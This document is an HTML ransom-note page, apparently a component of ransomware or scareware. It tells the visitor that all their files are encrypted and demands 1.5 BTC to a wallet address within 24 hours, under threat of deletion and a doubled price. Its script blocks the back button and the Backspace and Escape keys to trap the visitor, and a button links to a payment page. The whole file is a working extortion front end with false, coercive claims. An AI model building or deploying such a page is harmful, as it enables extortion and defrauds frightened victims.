
<!DOCTYPE html>
<html>
<head>
    <title>FILES ENCRYPTED</title>
    <script>
        // Disable back button
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
        
        // Disable keyboard navigation
        document.addEventListener("keydown", function(e) {
            if (e.key === "Backspace" || e.key === "Escape") {
                e.preventDefault();
            }
        });
    </script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 50px;
        }
        .warning {
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 20px auto;
            max-width: 600px;
            background-color: #1a0000;
        }
        .timer {
            font-size: 24px;
            color: #ffff00;
            margin: 20px 0;
        }
        .payment-info {
            background-color: #333;
            padding: 15px;
            margin: 20px auto;
            max-width: 500px;
            border: 1px solid #ff0000;
        }
        .payment-btn {
            background-color: #ff0000;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 20px 0;
        }
        .payment-btn:hover {
            background-color: #cc0000;
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️</h1>
        <p>All your personal files have been locked with military-grade encryption!</p>
        <p>Your documents, photos, databases, and important files are no longer accessible.</p>
    </div>

    <div class="timer">
        ⏰ TIME REMAINING: 24:00:00
    </div>

    <div class="payment-info">
        <h2>🔑 PAYMENT REQUIRED</h2>
        <p><strong>Amount:</strong> 1.5 BTC (Bitcoin)</p>
        <p><strong>Wallet Address:</strong> 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
        <p><strong>Payment Deadline:</strong> 24 hours</p>
        <p>⚠️ Failure to pay within 24 hours will result in permanent file deletion!</p>
        <p>⚠️ Price doubles after deadline!</p>
    </div>

    <p style="color: #ffff00;">Don't try to decrypt files yourself - this may cause permanent data loss!</p>

    <a href="unlock_crypto.php" class="payment-btn">💰 PAY NOW & UNLOCK FILES</a>

    <div style="margin-top: 30px; font-size: 12px; color: #666;">
        <p>Transaction ID: #RX-2024-<?php echo rand(100000, 999999); ?></p>
    </div>
</body>
</html>
